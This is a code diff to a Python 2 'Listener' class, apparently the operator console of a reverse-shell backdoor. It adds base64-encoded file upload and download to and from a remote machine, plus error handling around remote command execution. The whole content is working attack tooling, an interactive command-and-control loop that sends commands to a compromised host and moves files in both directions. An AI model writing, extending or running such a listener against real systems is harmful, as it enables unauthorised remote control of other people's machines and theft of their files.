@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 import socket, json
-
+import base64
 
 class Listener:
     def __init__(self, ip, port):
@@ -34,16 +34,26 @@ class Listener:
 
     def write_file(self, path, content):
         with open(path, "w") as file:
-            file.write(content)
+            file.write(base64.b64decode(content))
             return "[+] Downloaded successfully"
+
+    def read_file(self, path):
+        with open(path, "rb") as file:
+            return base64.b64encode(file.read())
 
     def run(self):
         while True:
             command = raw_input(">> ")
             command = command.split(" ")
-            command_result = self.execute_remotely(command)
-            if command[0] == "download":
-                command_result = self.write_file(command[1], command_result)
+            try:
+                if command[0] == "upload":
+                    file_content = self.read_file(command[1])
+                    command.append(file_content)
+                command_result = self.execute_remotely(command)
+                if command[0] == "download" and "[-] Error " not in command_result:
+                    command_result = self.write_file(command[1], command_result)
+            except Exception :
+                command_result = "[-] Error during command execution."
             print(command_result)
 
 
